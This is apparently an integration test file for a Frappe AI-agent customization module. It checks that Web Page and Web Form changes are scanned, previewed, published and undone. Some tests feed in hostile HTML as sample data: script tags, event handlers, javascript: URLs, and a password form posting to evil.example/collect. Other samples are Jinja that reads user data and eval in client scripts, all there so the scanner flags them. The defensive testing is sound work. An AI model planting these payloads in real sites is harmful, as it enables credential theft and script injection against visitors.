"""Web kind: Web Page and Web Form, the public website surface (docs/customization/01 §3.1 v3)."""

import json

import frappe
from frappe.tests import IntegrationTestCase

from ai_agent.customization.contract import CustomizationError
from ai_agent.customization.kinds.web import KIND, route_conflicts, scan_html, scan_jinja

ADMIN = "Administrator"


def critical(report):
	return {c.code for c in report.critical()}


def codes(report, level):
	return {c.code for c in report.checks if c.level == level}


class TestCustomizeWeb(IntegrationTestCase):
	def setUp(self):
		frappe.set_user(ADMIN)
		self.suffix = frappe.generate_hash(length=6).lower()

	def track(self, doctype, name):
		def remove():
			frappe.set_user(ADMIN)
			if frappe.db.exists(doctype, name):
				frappe.delete_doc(doctype, name, force=True, ignore_permissions=True)

		self.addCleanup(remove)
		return name

	def page_args(self, **extra):
		args = {"operation": "create", "doctype": "Web Page", "title": f"AI Test Offer {self.suffix}",
			"route": f"ai-test/offer-{self.suffix}", "content_type": "HTML",
			"content": "<h2>Summer offer</h2><p>See <a href=\"https://example.org/terms\">terms</a>.</p>",
			"purpose": "summer offer page"}
		args.update(extra)
		return args

	# -- normalize --------------------------------------------------------------------------
	def test_normalize_defaults_and_errors(self):
		spec = KIND.normalize(self.page_args(), ADMIN)
		self.assertEqual(spec["name"], f"ai-test-offer-{self.suffix}")
		self.assertEqual(spec["values"]["published"], 0)  # unpublished by default
		self.assertEqual(spec["values"]["main_section_html"], self.page_args()["content"])
		self.assertEqual(KIND.roles_for(spec) if hasattr(KIND, "roles_for") else KIND.required_roles,
			("System Manager", "Website Manager"))

		bad = [
			self.page_args(nope=1),  # unknown key
			self.page_args(doc_type="ToDo"),  # a Web Form argument on a page
			self.page_args(route="bad route!"),
			self.page_args(content_type="Page Builder"),
			{"operation": "create", "doctype": "Web Page", "title": "x"},  # no content
			{"operation": "update", "doctype": "Web Page", "name": f"missing-{self.suffix}"},
			{"operation": "create", "doctype": "Web Template", "title": "x"},
		]
		for args in bad:
			with self.assertRaises(CustomizationError, msg=args):
				KIND.normalize(args, ADMIN)
		self.assertEqual(KIND.normalize({"operation": "create", "doctype": "Web Form", "title": f"F {self.suffix}",
			"doc_type": "Issue", "form_fields": ["subject"]}, ADMIN)["values"]["login_required"], 1)

	# -- page checks -------------------------------------------------------------------------
	def test_clean_page_preview_and_links(self):
		report = KIND.check(KIND.normalize(self.page_args(), ADMIN), ADMIN)
		self.assertFalse(report.critical(), [c.message for c in report.critical()])
		self.assertIn("web.preview", codes(report, "ok"))
		self.assertIn("Summer offer", report.preview["html"])
		self.assertEqual(report.preview["rendered_as"], "Guest")
		self.assertIn("https://example.org/terms", report.preview["external_links"])
		self.assertIn("html.external_links", codes(report, "info"))
		self.assertEqual(report.risk, "medium")
		self.assertTrue(any("unpublished" in line for line in report.impact))
		json.dumps(report.to_dict())

	def test_published_is_high_risk(self):
		report = KIND.check(KIND.normalize(self.page_args(published=True), ADMIN), ADMIN)
		self.assertFalse(report.critical(), [c.message for c in report.critical()])
		self.assertIn("web.published", codes(report, "warning"))
		self.assertEqual(report.risk, "high")
		self.assertIn(frappe.utils.get_url(f"ai-test/offer-{self.suffix}"), report.impact[0])

	def test_active_html_is_critical_unless_allowed(self):
		html = ('<script>alert(1)</script><img src=x onerror="alert(1)"><iframe src="https://evil.example"></iframe>'
			'<a href="javascript:alert(1)">x</a><form action="https://evil.example/collect"><input type="password"></form>'
			'<meta http-equiv="refresh" content="0;url=https://evil.example"><base href="https://evil.example/">')
		expected = {"html.script", "html.event_handler", "html.embed", "html.javascript_url", "html.form_external",
			"html.password", "html.meta_refresh", "html.base"}
		report = KIND.check(KIND.normalize(self.page_args(content=html), ADMIN), ADMIN)
		self.assertTrue(expected <= critical(report), critical(report))
		allowed = KIND.check(KIND.normalize(self.page_args(content=html, allow_scripts=True), ADMIN), ADMIN)
		self.assertFalse(expected & critical(allowed), critical(allowed))
		self.assertTrue(expected <= codes(allowed, "warning"))
		self.assertEqual(allowed.risk, "high")

		report = KIND.check(KIND.normalize(self.page_args(javascript="console.log(1)"), ADMIN), ADMIN)
		self.assertIn("web.javascript", critical(report))
		report = KIND.check(KIND.normalize(self.page_args(css="body{background:url(javascript:alert(1))}"), ADMIN), ADMIN)
		self.assertIn("css.script", critical(report))

	def test_context_script_is_forbidden(self):
		report = KIND.check(KIND.normalize(self.page_args(context_script="context.x = 1"), ADMIN), ADMIN)
		self.assertIn("web.context_script", critical(report))
		# the requester (and, at execution, the approver) needs System Manager + Website Manager
		self.assertIn("roles.missing", critical(KIND.check(KIND.normalize(self.page_args(), "Guest"), "Guest")))

	def test_jinja_checks(self):
		bad = KIND.check(KIND.normalize(self.page_args(
			content="<p>{{ frappe.db.get_value('User', 'Administrator', 'email') }} {{ frappe.form_dict.q }}</p>"), ADMIN), ADMIN)
		self.assertIn("jinja.data", critical(bad))
		self.assertEqual(len([c for c in bad.checks if c.code == "jinja.data"]), 2)
		self.assertIn("jinja.syntax", {c.code for c in scan_jinja("{{ x ") if c.level == "critical"})
		self.assertIn("jinja.data", {c.code for c in scan_jinja("{% set f = frappe %}{{ f.db }}")})
		self.assertIn("jinja.data", {c.code for c in scan_jinja("{{ doc.db_set('published', 0) }}")})
		good = KIND.check(KIND.normalize(self.page_args(
			content="<p>{{ frappe.utils.formatdate('2026-01-02') }} {{ _('Hello') }}</p>", dynamic_template=1), ADMIN), ADMIN)
		self.assertFalse(good.critical(), [c.message for c in good.critical()])
		self.assertIn("jinja.dynamic", codes(good, "info"))
		self.assertNotIn("{{", good.preview["html"])  # rendered in the dry run

	def test_route_conflicts(self):
		self.assertTrue(route_conflicts("login", "Web Page", "x"))  # www page of frappe
		self.assertTrue(route_conflicts("app/todo", "Web Page", "x"))  # Desk
		self.assertTrue(route_conflicts("api/method/x", "Web Page", "x"))
		self.assertTrue(route_conflicts("kb/some-category", "Web Page", "x"))  # hooks website_route_rules
		self.assertFalse(route_conflicts(f"ai-test/free-{self.suffix}", "Web Page", "x"))
		report = KIND.check(KIND.normalize(self.page_args(route="login"), ADMIN), ADMIN)
		self.assertIn("web.route_taken", critical(report))
		self.assertEqual(scan_html("<p>plain</p>")[0], [])

	# -- page lifecycle ------------------------------------------------------------------------
	def test_page_create_update_publish_undo(self):
		spec = KIND.normalize(self.page_args(), ADMIN)
		name = self.track("Web Page", spec["name"])
		before = KIND.snapshot(spec)
		self.assertFalse(before["exists"])
		result = KIND.execute(spec, ADMIN)
		self.assertFalse([c for c in KIND.verify(spec, result) if c.level == "critical"])
		doc = frappe.get_doc("Web Page", name)
		self.assertEqual((doc.published, doc.route, doc.content_type), (0, f"ai-test/offer-{self.suffix}", "HTML"))
		self.assertEqual(result["undo"], {"operation": "delete", "doctype": "Web Page", "name": name})

		# a second create on the same name/route is refused
		self.assertIn("web.name_taken", critical(KIND.check(spec, ADMIN)))
		other = KIND.normalize(self.page_args(title=f"Other {self.suffix}"), ADMIN)
		self.assertIn("web.route_taken", critical(KIND.check(other, ADMIN)))

		update = KIND.normalize({"operation": "update", "doctype": "Web Page", "name": name,
			"content": "<h2>Winter offer</h2>", "published": True}, ADMIN)
		snap = KIND.snapshot(update)
		report = KIND.check(update, ADMIN)
		self.assertFalse(report.critical(), [c.message for c in report.critical()])
		self.assertTrue(report.preview["code"]["diff"])
		self.assertIn("published", {r["field"] for r in report.preview["diff"]})
		result = KIND.execute(update, ADMIN)
		self.assertFalse([c for c in KIND.verify(update, result) if c.level == "critical"])
		self.assertEqual(frappe.db.get_value("Web Page", name, "published"), 1)
		undo = result["undo"]
		self.assertFalse(KIND.check(undo, ADMIN).critical())
		KIND.execute(undo, ADMIN)
		self.assertEqual(KIND.snapshot(update), snap)  # content and published restored

		pub = KIND.normalize({"operation": "publish", "doctype": "Web Page", "name": name}, ADMIN)
		self.assertEqual(KIND.check(pub, ADMIN).risk, "high")
		result = KIND.execute(pub, ADMIN)
		self.assertFalse([c for c in KIND.verify(pub, result) if c.level == "critical"])
		unpub = KIND.normalize({"operation": "disable", "doctype": "Web Page", "name": name}, ADMIN)
		self.assertEqual(unpub["operation"], "unpublish")
		self.assertIn("web.delete_published", critical(KIND.check({"operation": "delete", "doctype": "Web Page", "name": name}, ADMIN)))
		KIND.execute(unpub, ADMIN)
		self.assertEqual(frappe.db.get_value("Web Page", name, "published"), 0)

		# undo of the create deletes; undo of the delete recreates it unpublished
		delete = {"operation": "delete", "doctype": "Web Page", "name": name}
		self.assertFalse(KIND.check(delete, ADMIN).critical())
		result = KIND.execute(delete, ADMIN)
		self.assertTrue([c for c in KIND.verify(delete, result) if c.code == "verify.deleted" and c.level == "ok"])
		recreate = result["undo"]
		self.assertEqual(recreate["operation"], "create")
		self.assertFalse(KIND.check(recreate, ADMIN).critical())
		KIND.execute(recreate, ADMIN)
		self.assertEqual(frappe.db.get_value("Web Page", name, "published"), 0)

	# -- web forms --------------------------------------------------------------------------------
	def form_args(self, **extra):
		args = {"operation": "create", "doctype": "Web Form", "title": f"AI Test Support {self.suffix}",
			"route": f"ai-test/support-{self.suffix}", "doc_type": "Issue",
			"form_fields": [{"fieldname": "subject", "reqd": 1}, {"fieldname": "description"}],
			"introduction_text": "<p>Tell us what went wrong.</p>"}
		args.update(extra)
		return args

	def test_form_checks(self):
		report = KIND.check(KIND.normalize(self.form_args(), ADMIN), ADMIN)
		self.assertFalse(report.critical(), [c.message for c in report.critical()])
		self.assertIn("web.preview", codes(report, "ok"))
		self.assertIn("Tell us what went wrong", report.preview["html"])  # the fields are drawn in the browser
		self.assertNotIn("<footer", report.preview["html"])
		self.assertEqual([f["fieldname"] for f in report.preview["fields"]], ["subject", "description"])
		self.assertTrue(any("ignore_permissions" in line for line in report.impact))

		missing = KIND.check(KIND.normalize(self.form_args(form_fields=["no_such_field"]), ADMIN), ADMIN)
		self.assertIn("form.field_missing", critical(missing))
		hidden = KIND.check(KIND.normalize(self.form_args(form_fields=[{"fieldname": "subject", "reqd": 1, "hidden": 1}]), ADMIN), ADMIN)
		self.assertIn("form.hidden_mandatory", critical(hidden))
		protected = KIND.check(KIND.normalize(self.form_args(doc_type="Server Script", form_fields=["name"]), ADMIN), ADMIN)
		self.assertIn("form.doctype", critical(protected))

		guest = KIND.check(KIND.normalize(self.form_args(login_required=0, allow_edit=1), ADMIN), ADMIN)
		self.assertIn("form.guest", critical(guest))
		spec = KIND.normalize(self.form_args(login_required=0, allow_guest=True, allow_edit=1, allow_multiple=1,
			form_fields=["subject", "description", "customer"]), ADMIN)
		self.assertEqual((spec["values"]["allow_edit"], spec["values"]["show_list"]), (0, 0))
		guest = KIND.check(spec, ADMIN)
		self.assertNotIn("form.guest", critical(guest))
		self.assertIn("form.guest", codes(guest, "warning"))
		self.assertIn("form.allow_multiple", codes(guest, "warning"))
		self.assertIn("form.forced", codes(guest, "info"))
		self.assertIn("form.guest_link", critical(guest))  # every Customer name would be listed to the internet
		self.assertTrue(any("internet can create Issue" in line for line in guest.impact))

		script = KIND.check(KIND.normalize(self.form_args(client_script="eval('1')"), ADMIN), ADMIN)
		self.assertIn("js.dynamic_code", critical(script))
		external = KIND.check(KIND.normalize(self.form_args(success_url="https://evil.example/thanks"), ADMIN), ADMIN)
		self.assertIn("form.success_url", codes(external, "warning"))

	def test_form_create_update_undo(self):
		spec = KIND.normalize(self.form_args(), ADMIN)
		name = self.track("Web Form", spec["name"])
		result = KIND.execute(spec, ADMIN)
		self.assertFalse([c for c in KIND.verify(spec, result) if c.level == "critical"])
		doc = frappe.get_doc("Web Form", name)
		self.assertEqual((doc.login_required, doc.published, doc.is_standard, doc.doc_type), (1, 0, 0, "Issue"))
		self.assertEqual([r.fieldname for r in doc.web_form_fields], ["subject", "description"])

		update = KIND.normalize({"operation": "update", "doctype": "Web Form", "name": name,
			"form_fields": ["subject"], "button_label": "Send"}, ADMIN)
		snap = KIND.snapshot(update)
		self.assertFalse(KIND.check(update, ADMIN).critical())
		result = KIND.execute(update, ADMIN)
		self.assertFalse([c for c in KIND.verify(update, result) if c.level == "critical"])
		self.assertEqual([r.fieldname for r in frappe.get_doc("Web Form", name).web_form_fields], ["subject"])
		KIND.execute(result["undo"], ADMIN)
		self.assertEqual(KIND.snapshot(update), snap)

		# a page cannot sit under the form's route
		page = KIND.normalize(self.page_args(route=f"ai-test/support-{self.suffix}/new"), ADMIN)
		self.assertIn("web.route_taken", critical(KIND.check(page, ADMIN)))
